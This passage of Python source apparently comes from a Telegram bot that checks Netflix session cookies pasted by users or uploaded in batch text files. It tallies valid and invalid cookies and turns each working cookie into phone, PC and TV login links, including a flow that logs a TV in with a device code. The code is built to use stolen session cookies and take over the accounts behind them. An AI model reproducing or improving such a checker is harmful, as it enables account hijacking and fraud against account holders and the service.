        "4️⃣ Send me that code!\n\n"
        "⌨️ *Type the 8-digit code now:*",
        parse_mode="Markdown",
    )


# ── Message handler ───────────────────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()

    # TV code (6-8 digit number when TV login pending)
    if context.user_data.get("tv_pending") and re.fullmatch(r"\d{6,8}", text):
        encrypted_id = context.user_data.pop("tv_encrypted_id", "")
        context.user_data.pop("tv_pending", None)

        msg = await update.message.reply_text(
            "📺 *Logging into Netflix TV...*\n\n_⏳ Please wait..._",
            parse_mode="Markdown",
        )
        ok, result = await asyncio.to_thread(tv_perform_login, encrypted_id, text)
        if ok:
            await msg.edit_text(
                f"✅ *TV Login Successful!*\n\n"
                f"🎬 Your Netflix TV is now logged in!\n\n"
                f"👑 {OWNER}",
                parse_mode="Markdown",
            )
        else:
            await msg.edit_text(
                f"❌ *TV Login Failed:* `{result}`\n\n"
                f"The code may have expired. Try again!\n\n"
                f"👑 {OWNER}",
                parse_mode="Markdown",
            )
        return

    # Auto-detect Netflix cookie — run full check automatically
    netflix_id = extract_netflix_id(text)
    if not netflix_id:
        return

    msg = await update.message.reply_text(
        "⚡ *Checking your cookie...*\n\n"
        "🔄 `1/3` — Loading Netflix session\n"
        "📄 `2/3` — Fetching account details\n"
        "🔑 `3/3` — Generating login tokens\n\n"
        "_⏳ This takes ~30 seconds..._",
        parse_mode="Markdown",
    )

    _stats["checked"] += 1
    success, data = await asyncio.to_thread(generate_full_info, netflix_id)

    if not success:
        _stats["invalid"] += 1
        await msg.edit_text(
            f"❌ *Cookie Invalid!*\n\n`{data.get('error', 'Unknown error')}`",
            parse_mode="Markdown",
        )
        return

    _stats["valid"] += 1
    _stats["tokens"] += 1

    info = data.get("info", {})
    pc_link = data["pc_link"]
    android_link = data["android_link"]
    chat_id = update.message.chat_id
    msg_id = update.message.message_id

    card = build_account_card(info, pc_link, android_link)

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📱 Phone Login", url=android_link),
                InlineKeyboardButton("🖥️ PC Login", url=pc_link),
            ],
            [
                InlineKeyboardButton(
                    "📺 TV Login Code", callback_data=f"tv|{chat_id}|{msg_id}"
                ),
            ],
        ]
    )

    await msg.edit_text(
        card,
        parse_mode="Markdown",
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )

    context.bot_data[f"nfid|{chat_id}|{msg_id}"] = netflix_id


# ── Flask keep-alive ──────────────────────────────────────────────────────────
flask_app = Flask(__name__)


@flask_app.route("/")
def home():
    return "🎬 Netflix Bot — Running!", 200


@flask_app.route("/ping")
def ping():
    return "pong", 200


def run_flask():
    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    Thread(target=run_flask, daemon=True).start()
    logger.info("Flask keep-alive on :5000")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("gen", gen_command))
    app.add_handler(CommandHandler("extract", extract_command))
    app.add_handler(CommandHandler("batch", batch_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("tv", tv_command))

    app.add_handler(CallbackQueryHandler(tv_callback, pattern=r"^tv\|"))
    app.add_handler(
        MessageHandler(filters.Document.FileExtension("txt"), batch_command)
    )
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("🤖 Bot polling...")
    app.run_polling()


if __name__ == "__main__":
    main()
